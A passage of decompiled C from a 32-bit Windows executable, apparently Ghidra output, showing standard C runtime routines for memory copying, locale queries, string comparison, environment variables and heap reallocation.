switchD_0041d737_caseD_1:
      *(undefined1 *)((int)puVar4 + 3) = *(undefined1 *)((int)puVar3 + 3);
      return param_1;
    case 2:
switchD_0041d737_caseD_2:
      *(undefined1 *)((int)puVar4 + 3) = *(undefined1 *)((int)puVar3 + 3);
      *(undefined1 *)((int)puVar4 + 2) = *(undefined1 *)((int)puVar3 + 2);
      return param_1;
    case 3:
switchD_0041d737_caseD_3:
      *(undefined1 *)((int)puVar4 + 3) = *(undefined1 *)((int)puVar3 + 3);
      *(undefined1 *)((int)puVar4 + 2) = *(undefined1 *)((int)puVar3 + 2);
      *(undefined1 *)((int)puVar4 + 1) = *(undefined1 *)((int)puVar3 + 1);
      return param_1;
    }
switchD_0041d737_caseD_0:
    return param_1;
  }
  puVar3 = param_1;
  if (((uint)param_1 & 3) == 0) {
    uVar1 = param_3 >> 2;
    uVar2 = param_3 & 3;
    if (7 < uVar1) {
      for (; uVar1 != 0; uVar1 = uVar1 - 1) {
        *puVar3 = *param_2;
        param_2 = param_2 + 1;
        puVar3 = puVar3 + 1;
      }
      switch(uVar2) {
      case 0:
        return param_1;
      case 2:
        goto switchD_0041d5b5_caseD_2;
      case 3:
        goto switchD_0041d5b5_caseD_3;
      }
      goto switchD_0041d5b5_caseD_1;
    }
  }
  else {
    switch(param_3) {
    case 0:
      goto switchD_0041d5b5_caseD_0;
    case 1:
      goto switchD_0041d5b5_caseD_1;
    case 2:
      goto switchD_0041d5b5_caseD_2;
    case 3:
      goto switchD_0041d5b5_caseD_3;
    default:
      uVar1 = (param_3 - 4) + ((uint)param_1 & 3);
      switch((uint)param_1 & 3) {
      case 1:
        uVar2 = uVar1 & 3;
        *(undefined1 *)param_1 = *(undefined1 *)param_2;
        *(undefined1 *)((int)param_1 + 1) = *(undefined1 *)((int)param_2 + 1);
        uVar1 = uVar1 >> 2;
        *(undefined1 *)((int)param_1 + 2) = *(undefined1 *)((int)param_2 + 2);
        param_2 = (undefined4 *)((int)param_2 + 3);
        puVar3 = (undefined4 *)((int)param_1 + 3);
        if (7 < uVar1) {
          for (; uVar1 != 0; uVar1 = uVar1 - 1) {
            *puVar3 = *param_2;
            param_2 = param_2 + 1;
            puVar3 = puVar3 + 1;
          }
          switch(uVar2) {
          case 0:
            return param_1;
          case 2:
            goto switchD_0041d5b5_caseD_2;
          case 3:
            goto switchD_0041d5b5_caseD_3;
          }
          goto switchD_0041d5b5_caseD_1;
        }
        break;
      case 2:
        uVar2 = uVar1 & 3;
        *(undefined1 *)param_1 = *(undefined1 *)param_2;
        uVar1 = uVar1 >> 2;
        *(undefined1 *)((int)param_1 + 1) = *(undefined1 *)((int)param_2 + 1);
        param_2 = (undefined4 *)((int)param_2 + 2);
        puVar3 = (undefined4 *)((int)param_1 + 2);
        if (7 < uVar1) {
          for (; uVar1 != 0; uVar1 = uVar1 - 1) {
            *puVar3 = *param_2;
            param_2 = param_2 + 1;
            puVar3 = puVar3 + 1;
          }
          switch(uVar2) {
          case 0:
            return param_1;
          case 2:
            goto switchD_0041d5b5_caseD_2;
          case 3:
            goto switchD_0041d5b5_caseD_3;
          }
          goto switchD_0041d5b5_caseD_1;
        }
        break;
      case 3:
        uVar2 = uVar1 & 3;
        *(undefined1 *)param_1 = *(undefined1 *)param_2;
        param_2 = (undefined4 *)((int)param_2 + 1);
        uVar1 = uVar1 >> 2;
        puVar3 = (undefined4 *)((int)param_1 + 1);
        if (7 < uVar1) {
          for (; uVar1 != 0; uVar1 = uVar1 - 1) {
            *puVar3 = *param_2;
            param_2 = param_2 + 1;
            puVar3 = puVar3 + 1;
          }
          switch(uVar2) {
          case 0:
            return param_1;
          case 2:
            goto switchD_0041d5b5_caseD_2;
          case 3:
            goto switchD_0041d5b5_caseD_3;
          }
          goto switchD_0041d5b5_caseD_1;
        }
      }
    }
  }
  switch(uVar1) {
  case 7:
    puVar3[uVar1 - 7] = param_2[uVar1 - 7];
  case 6:
    puVar3[uVar1 - 6] = param_2[uVar1 - 6];
  case 5:
    puVar3[uVar1 - 5] = param_2[uVar1 - 5];
  case 4:
    puVar3[uVar1 - 4] = param_2[uVar1 - 4];
  case 3:
    puVar3[uVar1 - 3] = param_2[uVar1 - 3];
  case 2:
    puVar3[uVar1 - 2] = param_2[uVar1 - 2];
  case 1:
    puVar3[uVar1 - 1] = param_2[uVar1 - 1];
    param_2 = param_2 + uVar1;
    puVar3 = puVar3 + uVar1;
  }
  switch(uVar2) {
  case 1:
switchD_0041d5b5_caseD_1:
    *(undefined1 *)puVar3 = *(undefined1 *)param_2;
    return param_1;
  case 2:
switchD_0041d5b5_caseD_2:
    *(undefined1 *)puVar3 = *(undefined1 *)param_2;
    *(undefined1 *)((int)puVar3 + 1) = *(undefined1 *)((int)param_2 + 1);
    return param_1;
  case 3:
switchD_0041d5b5_caseD_3:
    *(undefined1 *)puVar3 = *(undefined1 *)param_2;
    *(undefined1 *)((int)puVar3 + 1) = *(undefined1 *)((int)param_2 + 1);
    *(undefined1 *)((int)puVar3 + 2) = *(undefined1 *)((int)param_2 + 2);
    return param_1;
  }
switchD_0041d5b5_caseD_0:
  return param_1;
}



/* VA 0041d8c0 */

int __cdecl FUN_0041d8c0(uint param_1,int param_2)

{
  byte bVar1;
  DWORD *pDVar2;
  byte bVar3;

  bVar1 = *(byte *)((&DAT_00430280)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 0x24);
  if (param_2 == 0x8000) {
    bVar3 = bVar1 & 0x7f;
  }
  else {
    if (param_2 != 0x4000) {
      pDVar2 = FUN_00419020();
      *pDVar2 = 0x16;
      return -1;
    }
    bVar3 = bVar1 | 0x80;
  }
  *(byte *)((&DAT_00430280)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 0x24) = bVar3;
  return (-(uint)((bVar1 & 0x80) != 0) & 0xffffc000) + 0x8000;
}



/* VA 0041d930 */

int __cdecl FUN_0041d930(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  HMODULE hModule;
  int iVar1;

  iVar1 = 0;
  if (DAT_0042f0e0 != (FARPROC)0x0) {
LAB_0041d980:
    if (DAT_0042f0e4 != (FARPROC)0x0) {
      iVar1 = (*DAT_0042f0e4)();
    }
    if ((iVar1 != 0) && (DAT_0042f0e8 != (FARPROC)0x0)) {
      iVar1 = (*DAT_0042f0e8)(iVar1);
    }
    iVar1 = (*DAT_0042f0e0)(iVar1,param_1,param_2,param_3);
    return iVar1;
  }
  hModule = LoadLibraryA("user32.dll");
  if (hModule != (HMODULE)0x0) {
    DAT_0042f0e0 = GetProcAddress(hModule,"MessageBoxA");
    if (DAT_0042f0e0 != (FARPROC)0x0) {
      DAT_0042f0e4 = GetProcAddress(hModule,"GetActiveWindow");
      DAT_0042f0e8 = GetProcAddress(hModule,"GetLastActivePopup");
      goto LAB_0041d980;
    }
  }
  return 0;
}



/* VA 0041d9c0 */

undefined4 __cdecl FUN_0041d9c0(int param_1,LCID param_2,LCTYPE param_3,char *param_4)

{
  byte bVar1;
  bool bVar2;
  uint uVar3;
  DWORD DVar4;
  LPSTR _Source;
  char *_Dest;
  int iVar5;
  byte *pbVar6;
  CHAR local_80 [128];

  if (param_1 != 1) {
    if (param_1 != 0) {
      return 0xffffffff;
    }
    iVar5 = FUN_0041db70(param_2,param_3,(LPWSTR)&DAT_0042f0f8,4,0);
    if (iVar5 != 0) {
      pbVar6 = &DAT_0042f0f8;
      *param_4 = '\0';
      while( true ) {
        bVar1 = *pbVar6;
        if (DAT_0042adcc < 2) {
          uVar3 = (byte)PTR_DAT_0042abc0[(uint)bVar1 * 2] & 4;
        }
        else {
          uVar3 = FUN_00415fc0((uint)bVar1,4);
        }
        if (uVar3 == 0) break;
        pbVar6 = pbVar6 + 2;
        *param_4 = *param_4 * '\n' + bVar1 + -0x30;
        if (0x42f0ff < (int)pbVar6) {
          return 0;
        }
      }
      return 0;
    }
    return 0xffffffff;
  }
  _Source = local_80;
  bVar2 = false;
  uVar3 = FUN_0041dca0(param_2,param_3,local_80,0x80,0);
  if (uVar3 == 0) {
    DVar4 = GetLastError();
    if (((DVar4 != 0x7a) || (uVar3 = FUN_0041dca0(param_2,param_3,(LPSTR)0x0,0,0), uVar3 == 0)) ||
       (_Source = (LPSTR)FUN_00414db0(uVar3), _Source == (LPSTR)0x0)) goto LAB_0041da70;
    bVar2 = true;
    uVar3 = FUN_0041dca0(param_2,param_3,_Source,uVar3,0);
    if (uVar3 == 0) goto LAB_0041da70;
  }
  _Dest = (char *)FUN_00414db0(uVar3);
  *(char **)param_4 = _Dest;
  if (_Dest != (char *)0x0) {
    _strncpy(_Dest,_Source,uVar3);
    if (!bVar2) {
      return 0;
    }
    FUN_00414d40(_Source);
    return 0;
  }
LAB_0041da70:
  if (!bVar2) {
    return 0xffffffff;
  }
  FUN_00414d40(_Source);
  return 0xffffffff;
}



/* VA 0041db70 */

int __cdecl FUN_0041db70(LCID param_1,LCTYPE param_2,LPWSTR param_3,int param_4,UINT param_5)

{
  int iVar1;
  uint cchData;
  LPSTR lpLCData;

  if (DAT_0042f104 == 0) {
    iVar1 = GetLocaleInfoW(0,1,(LPWSTR)0x0,0);
    if (iVar1 == 0) {
      iVar1 = GetLocaleInfoA(0,1,(LPSTR)0x0,0);
      if (iVar1 == 0) {
        return 0;
      }
      DAT_0042f104 = 2;
    }
    else {
      DAT_0042f104 = 1;
    }
  }
  if (DAT_0042f104 == 1) {
    iVar1 = GetLocaleInfoW(param_1,param_2,param_3,param_4);
    return iVar1;
  }
  if (DAT_0042f104 != 2) {
    return DAT_0042f104;
  }
  if (param_5 == 0) {
    param_5 = DAT_0042ed60;
  }
  cchData = GetLocaleInfoA(param_1,param_2,(LPSTR)0x0,0);
  if (cchData != 0) {
    lpLCData = (LPSTR)FUN_00414db0(cchData);
    if (lpLCData == (LPSTR)0x0) {
      return 0;
    }
    iVar1 = GetLocaleInfoA(param_1,param_2,lpLCData,cchData);
    if (iVar1 != 0) {
      if (param_4 == 0) {
        iVar1 = MultiByteToWideChar(param_5,1,lpLCData,-1,(LPWSTR)0x0,0);
        if (iVar1 != 0) {
          FUN_00414d40(lpLCData);
          return iVar1;
        }
      }
      else {
        iVar1 = MultiByteToWideChar(param_5,1,lpLCData,-1,param_3,param_4);
        if (iVar1 != 0) {
          FUN_00414d40(lpLCData);
          return iVar1;
        }
      }
    }
    FUN_00414d40(lpLCData);
    return 0;
  }
  return 0;
}



/* VA 0041dca0 */

int __cdecl FUN_0041dca0(LCID param_1,LCTYPE param_2,LPSTR param_3,int param_4,UINT param_5)

{
  int iVar1;
  LPWSTR lpLCData;

  if (DAT_0042f108 == 0) {
    iVar1 = GetLocaleInfoA(0,1,(LPSTR)0x0,0);
    if (iVar1 == 0) {
      iVar1 = GetLocaleInfoW(0,1,(LPWSTR)0x0,0);
      if (iVar1 == 0) {
        return 0;
      }
      DAT_0042f108 = 1;
    }
    else {
      DAT_0042f108 = 2;
    }
  }
  if (DAT_0042f108 == 2) {
    iVar1 = GetLocaleInfoA(param_1,param_2,param_3,param_4);
    return iVar1;
  }
  if (DAT_0042f108 != 1) {
    return DAT_0042f108;
  }
  if (param_5 == 0) {
    param_5 = DAT_0042ed60;
  }
  iVar1 = GetLocaleInfoW(param_1,param_2,(LPWSTR)0x0,0);
  if (iVar1 != 0) {
    lpLCData = (LPWSTR)FUN_00414db0(iVar1 * 2);
    if (lpLCData == (LPWSTR)0x0) {
      return 0;
    }
    iVar1 = GetLocaleInfoW(param_1,param_2,lpLCData,iVar1);
    if (iVar1 != 0) {
      if (param_4 == 0) {
        iVar1 = WideCharToMultiByte(param_5,0x220,lpLCData,-1,(LPSTR)0x0,0,(LPCSTR)0x0,(LPBOOL)0x0);
        if (iVar1 != 0) {
          FUN_00414d40((undefined *)lpLCData);
          return iVar1;
        }
      }
      else {
        iVar1 = WideCharToMultiByte(param_5,0x220,lpLCData,-1,param_3,param_4,(LPCSTR)0x0,
                                    (LPBOOL)0x0);
        if (iVar1 != 0) {
          FUN_00414d40((undefined *)lpLCData);
          return iVar1;
        }
      }
    }
    FUN_00414d40((undefined *)lpLCData);
    return 0;
  }
  return 0;
}



/* VA 0041dde0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

uint __cdecl FUN_0041dde0(byte *param_1,byte *param_2)

{
  bool bVar1;
  int iVar2;
  byte bVar3;
  byte bVar4;
  byte bVar5;
  char cVar6;
  uint uVar8;
  uint uVar9;
  uint uVar7;

  iVar2 = _DAT_004313a8;
  if (DAT_0042ed50 == 0) {
    bVar5 = 0xff;
    do {
      do {
        cVar6 = '\0';
        if (bVar5 == 0) goto LAB_0041de2e;
        bVar5 = *param_2;
        param_2 = param_2 + 1;
        bVar4 = *param_1;
        param_1 = param_1 + 1;
      } while (bVar4 == bVar5);
      bVar3 = bVar5 + 0xbf + (-((byte)(bVar5 + 0xbf) < 0x1a) & 0x20U) + 0x41;
      bVar4 = bVar4 + 0xbf;
      bVar5 = bVar4 + (-(bVar4 < 0x1a) & 0x20U) + 0x41;
    } while (bVar5 == bVar3);
    cVar6 = (bVar5 < bVar3) * -2 + '\x01';
LAB_0041de2e:
    uVar7 = (uint)cVar6;
  }
  else {
    LOCK();
    _DAT_004313a8 = _DAT_004313a8 + 1;
    UNLOCK();
    bVar1 = 0 < DAT_004313a4;
    if (bVar1) {
      LOCK();
      UNLOCK();
      _DAT_004313a8 = iVar2;
      FUN_00417120(0x13);
    }
    uVar9 = (uint)bVar1;
    uVar7 = 0xff;
    uVar8 = 0;
    do {
      do {
        if ((char)uVar7 == '\0') goto LAB_0041de8f;
        bVar5 = *param_2;
        uVar7 = CONCAT31((int3)(uVar7 >> 8),bVar5);
        param_2 = param_2 + 1;
        bVar4 = *param_1;
        uVar8 = CONCAT31((int3)(uVar8 >> 8),bVar4);
        param_1 = param_1 + 1;
      } while (bVar5 == bVar4);
      uVar8 = FUN_00414fc0(uVar8);
      uVar7 = FUN_00414fc0(uVar7);
    } while ((byte)uVar8 == (byte)uVar7);
    uVar8 = (uint)((byte)uVar8 < (byte)uVar7);
    uVar7 = (1 - uVar8) - (uint)(uVar8 != 0);
LAB_0041de8f:
    if (uVar9 == 0) {
      LOCK();
      _DAT_004313a8 = _DAT_004313a8 + -1;
      UNLOCK();
    }
    else {
      FUN_004171a0(0x13);
    }
  }
  return uVar7;
}



/* VA 0041deb0 */

void FUN_0041deb0(void)

{
  __amsg_exit(2);
  return;
}



/* VA 0041dec0 */

int __cdecl FUN_0041dec0(byte *param_1,byte *param_2,LPWSTR param_3)

{
  int iVar1;

  if (param_3 == (LPWSTR)0x0) {
    return 0;
  }
  iVar1 = FUN_0041df80(DAT_0042ef68,1,param_1,param_3,param_2,(int)param_3,DAT_0042ef64);
  if (iVar1 == 0) {
    return 0x7fffffff;
  }
  return iVar1 + -2;
}



/* VA 0041df00 */

undefined4 FUN_0041df00(void)

{
  LPCWSTR lpWideCharStr;
  uint cbMultiByte;
  byte *lpMultiByteStr;
  int iVar1;
  int *piVar2;

  lpWideCharStr = (LPCWSTR)*DAT_0042ec88;
  piVar2 = DAT_0042ec88;
  if (lpWideCharStr == (LPCWSTR)0x0) {
    return 0;
  }
  while (((cbMultiByte = WideCharToMultiByte(1,0,lpWideCharStr,-1,(LPSTR)0x0,0,(LPCSTR)0x0,
                                             (LPBOOL)0x0), cbMultiByte != 0 &&
          (lpMultiByteStr = (byte *)FUN_00414db0(cbMultiByte), lpMultiByteStr != (byte *)0x0)) &&
         (iVar1 = WideCharToMultiByte(1,0,(LPCWSTR)*piVar2,-1,(LPSTR)lpMultiByteStr,cbMultiByte,
                                      (LPCSTR)0x0,(LPBOOL)0x0), iVar1 != 0))) {
    FUN_0041e250(lpMultiByteStr,0);
    lpWideCharStr = (LPCWSTR)piVar2[1];
    piVar2 = piVar2 + 1;
    if (lpWideCharStr == (LPCWSTR)0x0) {
      return 0;
    }
  }
  return 0xffffffff;
}



/* VA 0041df80 */

int __cdecl
FUN_0041df80(LCID param_1,DWORD param_2,byte *param_3,LPWSTR param_4,byte *param_5,int param_6,
            UINT param_7)

{
  int iVar1;
  LPWSTR cbMultiByte;
  BOOL BVar2;
  BYTE *pBVar3;
  PCNZWCH lpWideCharStr;
  int iVar4;
  int iVar5;
  int local_18;
  _cpinfo local_14;

  if (DAT_0042f110 == 0) {
    iVar1 = CompareStringA(0,0,"",1,"",1);
    if (iVar1 == 0) {
      iVar1 = CompareStringW(0,0,L"",1,L"",1);
      if (iVar1 == 0) {
        return 0;
      }
      DAT_0042f110 = 1;
    }
    else {
      DAT_0042f110 = 2;
    }
  }
  cbMultiByte = param_4;
  if (0 < (int)param_4) {
    cbMultiByte = (LPWSTR)FUN_00417d20((char *)param_3,(int)param_4);
  }
  if (0 < param_6) {
    param_6 = FUN_00417d20((char *)param_5,param_6);
  }
  if (DAT_0042f110 == 2) {
    iVar1 = CompareStringA(param_1,param_2,(PCNZCH)param_3,(int)cbMultiByte,(PCNZCH)param_5,param_6)
    ;
    return iVar1;
  }
  local_18 = DAT_0042f110;
  if (DAT_0042f110 == 1) {
    local_18 = 0;
    param_4 = (LPWSTR)0x0;
    if (param_7 == 0) {
      param_7 = DAT_0042ed60;
    }
    if ((cbMultiByte == (LPWSTR)0x0) || (param_6 == 0)) {
      if (cbMultiByte == (LPWSTR)param_6) {
        return 2;
      }
      if (1 < param_6) {
        return 1;
      }
      if (1 < (int)cbMultiByte) {
        return 3;
      }
      BVar2 = GetCPInfo(param_7,&local_14);
      if (BVar2 == 0) {
        return 0;
      }
      if (0 < (int)cbMultiByte) {
        if (local_14.MaxCharSize < 2) {
          return 3;
        }
        pBVar3 = local_14.LeadByte;
        while( true ) {
          if ((local_14.LeadByte[0] == 0) || (pBVar3[1] == 0)) {
            return 3;
          }
          if ((*pBVar3 <= *param_3) && (*param_3 <= pBVar3[1])) break;
          local_14.LeadByte[0] = pBVar3[2];
          pBVar3 = pBVar3 + 2;
        }
        return 2;
      }
      if (0 < param_6) {
        if (local_14.MaxCharSize < 2) {
          return 1;
        }
        pBVar3 = local_14.LeadByte;
        while( true ) {
          if ((local_14.LeadByte[0] == 0) || (pBVar3[1] == 0)) {
            return 1;
          }
          if ((*pBVar3 <= *param_5) && (*param_5 <= pBVar3[1])) break;
          local_14.LeadByte[0] = pBVar3[2];
          pBVar3 = pBVar3 + 2;
        }
        return 2;
      }
    }
    iVar1 = MultiByteToWideChar(param_7,9,(LPCSTR)param_3,(int)cbMultiByte,(LPWSTR)0x0,0);
    if (iVar1 == 0) {
      return 0;
    }
    lpWideCharStr = (PCNZWCH)FUN_00414db0(iVar1 * 2);
    if (lpWideCharStr == (PCNZWCH)0x0) {
      return 0;
    }
    iVar4 = MultiByteToWideChar(param_7,1,(LPCSTR)param_3,(int)cbMultiByte,lpWideCharStr,iVar1);
    if ((((iVar4 != 0) &&
         (iVar4 = MultiByteToWideChar(param_7,9,(LPCSTR)param_5,param_6,(LPWSTR)0x0,0), iVar4 != 0))
        && (param_4 = (LPWSTR)FUN_00414db0(iVar4 * 2), param_4 != (LPWSTR)0x0)) &&
       (iVar5 = MultiByteToWideChar(param_7,1,(LPCSTR)param_5,param_6,param_4,iVar4), iVar5 != 0)) {
      local_18 = CompareStringW(param_1,param_2,lpWideCharStr,iVar1,param_4,iVar4);
    }
    FUN_00414d40((undefined *)lpWideCharStr);
    FUN_00414d40((undefined *)param_4);
  }
  return local_18;
}



/* VA 0041e250 */

undefined4 __cdecl FUN_0041e250(byte *param_1,int param_2)

{
  byte bVar1;
  int iVar2;
  int *piVar3;
  byte *pbVar4;
  int iVar5;
  LPWSTR pWVar6;
  int *piVar7;
  uint uVar8;
  uint uVar9;
  byte *pbVar10;
  byte *pbVar11;
  bool bVar12;

  if (param_1 == (byte *)0x0) {
    return 0xffffffff;
  }
  pbVar4 = FUN_0041e700(param_1,0x3d);
  if (pbVar4 == (byte *)0x0) {
    return 0xffffffff;
  }
  if (param_1 == pbVar4) {
    return 0xffffffff;
  }
  bVar12 = pbVar4[1] == 0;
  if (DAT_0042ec80 == DAT_0042ec84) {
    DAT_0042ec80 = FUN_0041e4e0(DAT_0042ec80);
  }
  if (DAT_0042ec80 == (int *)0x0) {
    if ((param_2 == 0) || (DAT_0042ec88 == (undefined4 *)0x0)) {
      if (bVar12) {
        return 0;
      }
      DAT_0042ec80 = (int *)FUN_00414db0(4);
      if (DAT_0042ec80 == (int *)0x0) {
        return 0xffffffff;
      }
      *DAT_0042ec80 = 0;
      if (DAT_0042ec88 == (undefined4 *)0x0) {
        DAT_0042ec88 = (undefined4 *)FUN_00414db0(4);
        if (DAT_0042ec88 == (undefined4 *)0x0) {
          return 0xffffffff;
        }
        *DAT_0042ec88 = 0;
      }
    }
    else {
      iVar5 = FUN_0041df00();
      if (iVar5 != 0) {
        return 0xffffffff;
      }
    }
  }
  piVar7 = DAT_0042ec80;
  pWVar6 = (LPWSTR)(pbVar4 + -(int)param_1);
  iVar5 = FUN_0041e460(param_1,pWVar6);
  if ((iVar5 < 0) || (*piVar7 == 0)) {
    if (bVar12) {
      return 0;
    }
    if (iVar5 < 0) {
      iVar5 = -iVar5;
    }
    piVar7 = FUN_0041e550(piVar7,iVar5 * 4 + 8);
    if (piVar7 == (int *)0x0) {
      return 0xffffffff;
    }
    piVar7[iVar5] = (int)param_1;
    piVar7[iVar5 + 1] = 0;
    DAT_0042ec80 = piVar7;
  }
  else if (bVar12) {
    FUN_00414d40((undefined *)piVar7[iVar5]);
    iVar2 = piVar7[iVar5];
    piVar3 = piVar7 + iVar5;
    while (iVar2 != 0) {
      *piVar3 = piVar3[1];
      iVar5 = iVar5 + 1;
      iVar2 = piVar3[1];
      piVar3 = piVar3 + 1;
    }
    piVar7 = FUN_0041e550(piVar7,iVar5 * 4);
    if (piVar7 != (int *)0x0) {
      DAT_0042ec80 = piVar7;
    }
  }
  else {
    piVar7[iVar5] = (int)param_1;
  }
  if (param_2 != 0) {
    uVar8 = 0xffffffff;
    pbVar4 = param_1;
    do {
      if (uVar8 == 0) break;
      uVar8 = uVar8 - 1;
      bVar1 = *pbVar4;
      pbVar4 = pbVar4 + 1;
    } while (bVar1 != 0);
    pbVar4 = (byte *)FUN_00414db0(~uVar8 + 1);
    if (pbVar4 != (byte *)0x0) {
      uVar8 = 0xffffffff;
      do {
        pbVar10 = param_1;
        if (uVar8 == 0) break;
        uVar8 = uVar8 - 1;
        pbVar10 = param_1 + 1;
        bVar1 = *param_1;
        param_1 = pbVar10;
      } while (bVar1 != 0);
      uVar8 = ~uVar8;
      pbVar10 = pbVar10 + -uVar8;
      pbVar11 = pbVar4;
      for (uVar9 = uVar8 >> 2; uVar9 != 0; uVar9 = uVar9 - 1) {
        *(undefined4 *)pbVar11 = *(undefined4 *)pbVar10;
        pbVar10 = pbVar10 + 4;
        pbVar11 = pbVar11 + 4;
      }
      for (uVar8 = uVar8 & 3; uVar8 != 0; uVar8 = uVar8 - 1) {
        *pbVar11 = *pbVar10;
        pbVar10 = pbVar10 + 1;
        pbVar11 = pbVar11 + 1;
      }
      pbVar4[(int)pWVar6] = 0;
      SetEnvironmentVariableA
                ((LPCSTR)pbVar4,(LPCSTR)(~-(uint)bVar12 & (uint)(pbVar4 + 1 + (int)pWVar6)));
      FUN_00414d40(pbVar4);
      return 0;
    }
  }
  return 0;
}



/* VA 0041e460 */

int __cdecl FUN_0041e460(byte *param_1,LPWSTR param_2)

{
  byte *pbVar1;
  int iVar2;
  int *piVar3;

  pbVar1 = (byte *)*DAT_0042ec80;
  piVar3 = DAT_0042ec80;
  if (pbVar1 == (byte *)0x0) {
    return 0;
  }
  while ((iVar2 = FUN_0041dec0(param_1,pbVar1,param_2), iVar2 != 0 ||
         ((*(char *)(*piVar3 + (int)param_2) != '=' && (*(char *)(*piVar3 + (int)param_2) != '\0')))
         )) {
    pbVar1 = (byte *)piVar3[1];
    piVar3 = piVar3 + 1;
    if (pbVar1 == (byte *)0x0) {
      return -((int)piVar3 - (int)DAT_0042ec80 >> 2);
    }
  }
  return (int)piVar3 - (int)DAT_0042ec80 >> 2;
}



/* VA 0041e4e0 */

undefined4 * __cdecl FUN_0041e4e0(int *param_1)

{
  int iVar1;
  int *piVar2;
  undefined4 *puVar3;
  char *pcVar4;
  int iVar5;
  undefined4 *puVar6;

  iVar5 = 0;
  if (param_1 != (int *)0x0) {
    iVar1 = *param_1;
    piVar2 = param_1;
    while (iVar1 != 0) {
      piVar2 = piVar2 + 1;
      iVar5 = iVar5 + 1;
      iVar1 = *piVar2;
    }
    puVar3 = (undefined4 *)FUN_00414db0(iVar5 * 4 + 4);
    if (puVar3 == (undefined4 *)0x0) {
      __amsg_exit(9);
    }
    pcVar4 = (char *)*param_1;
    puVar6 = puVar3;
    while (pcVar4 != (char *)0x0) {
      param_1 = param_1 + 1;
      pcVar4 = FUN_0041e7d0(pcVar4);
      *puVar6 = pcVar4;
      puVar6 = puVar6 + 1;
      pcVar4 = (char *)*param_1;
    }
    *puVar6 = 0;
    return puVar3;
  }
  return (undefined4 *)0x0;
}



/* VA 0041e550 */

int * __cdecl FUN_0041e550(int *param_1,uint param_2)

{
  int *piVar1;
  byte *pbVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  int *piVar6;
  int *piVar7;
  int *local_8;
  int local_4;

  if (param_1 == (int *)0x0) {
    piVar1 = (int *)FUN_00414db0(param_2);
    return piVar1;
  }
  if (param_2 == 0) {
    FUN_00414d40((undefined *)param_1);
    return (int *)0x0;
  }
  uVar4 = param_2;
  if (param_2 < 0xffffffe1) {
    if (param_2 == 0) {
      param_2 = 0x10;
      uVar4 = param_2;
    }
    else {
      param_2 = param_2 + 0xf & 0xfffffff0;
      uVar4 = param_2;
    }
  }
  do {
    piVar1 = (int *)0x0;
    if (uVar4 < 0xffffffe1) {
      FUN_00417120(9);
      pbVar2 = (byte *)FUN_00417540((undefined *)param_1,&local_4,(uint *)&local_8);
      if (pbVar2 == (byte *)0x0) {
        FUN_004171a0(9);
        piVar1 = HeapReAlloc(DAT_004313ac,0,param_1,uVar4);
      }
      else {
        if (uVar4 < DAT_0042ceec) {
          iVar3 = FUN_004179c0(local_4,local_8,pbVar2,uVar4 >> 4);
          piVar1 = param_1;
          if (iVar3 != 0) goto LAB_0041e655;
          piVar1 = FUN_00417600(uVar4 >> 4);
          if (piVar1 != (int *)0x0) {
            uVar5 = (uint)*pbVar2 << 4;
            if (uVar4 <= (uint)*pbVar2 << 4) {
              uVar5 = uVar4;
            }
            piVar6 = param_1;
            piVar7 = piVar1;
            for (uVar4 = uVar5 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
              *piVar7 = *piVar6;
              piVar6 = piVar6 + 1;
              piVar7 = piVar7 + 1;
            }
            for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
              *(char *)piVar7 = (char)*piVar6;
              piVar6 = (int *)((int)piVar6 + 1);
              piVar7 = (int *)((int)piVar7 + 1);
            }
            FUN_004175a0(local_4,(int)local_8,pbVar2);
            uVar4 = param_2;
            goto LAB_0041e655;
          }
LAB_0041e659:
          piVar1 = HeapAlloc(DAT_004313ac,0,uVar4);
          if (piVar1 != (int *)0x0) {
            uVar5 = (uint)*pbVar2 << 4;
            if (uVar4 <= (uint)*pbVar2 << 4) {
              uVar5 = uVar4;
            }
            piVar6 = param_1;
            piVar7 = piVar1;
            for (uVar4 = uVar5 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
              *piVar7 = *piVar6;
              piVar6 = piVar6 + 1;
              piVar7 = piVar7 + 1;
            }
            for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
              *(char *)piVar7 = (char)*piVar6;
              piVar6 = (int *)((int)piVar6 + 1);
              piVar7 = (int *)((int)piVar7 + 1);
            }
            FUN_004175a0(local_4,(int)local_8,pbVar2);
            uVar4 = param_2;
          }
        }
        else {
LAB_0041e655:
          if (piVar1 == (int *)0x0) goto LAB_0041e659;
        }
        FUN_004171a0(9);
      }
    }
    if ((piVar1 != (int *)0x0) || (DAT_0042ed34 == 0)) {
      return piVar1;
    }
    iVar3 = FUN_00417a90(uVar4);
    if (iVar3 == 0) {
      return (int *)0x0;
    }
  } while( true );
}



/* VA 0041e700 */

byte * __cdecl FUN_0041e700(byte *param_1,uint param_2)

{
  byte bVar1;
  uint uVar2;
  byte *pbVar3;

  if (DAT_0042ef64 == 0) {
    pbVar3 = (byte *)_strchr((char *)param_1,param_2);
    return pbVar3;
  }
  FUN_00417120(0x19);
  bVar1 = *param_1;
  while (uVar2 = (uint)bVar1, bVar1 != 0) {
    if ((*(byte *)((int)&DAT_0042ee60 + uVar2 + 1) & 4) == 0) {
      pbVar3 = param_1;
      if (param_2 == uVar2) break;
    }
    else {
      pbVar3 = param_1 + 1;
      if (param_1[1] == 0) {
        FUN_004171a0(0x19);
        return (byte *)0x0;
      }
      if (param_2 == CONCAT11(bVar1,param_1[1])) {
        FUN_004171a0(0x19);
        return param_1;
      }
    }
    param_1 = pbVar3 + 1;
    bVar1 = pbVar3[1];
  }
  FUN_004171a0(0x19);
  return (byte *)((param_2 != uVar2) - 1 & (uint)param_1);
}



/* VA 0041e7d0 */

char * __cdecl FUN_0041e7d0(char *param_1)

{
  char cVar1;
  char *pcVar2;
  uint uVar3;
  uint uVar4;
  char *pcVar5;
  char *pcVar6;

  if (param_1 != (char *)0x0) {
    uVar3 = 0xffffffff;
    pcVar2 = param_1;
    do {
      if (uVar3 == 0) break;
      uVar3 = uVar3 - 1;
      cVar1 = *pcVar2;
      pcVar2 = pcVar2 + 1;
    } while (cVar1 != '\0');
    pcVar2 = (char *)FUN_00414db0(~uVar3);
    if (pcVar2 != (char *)0x0) {
      uVar3 = 0xffffffff;
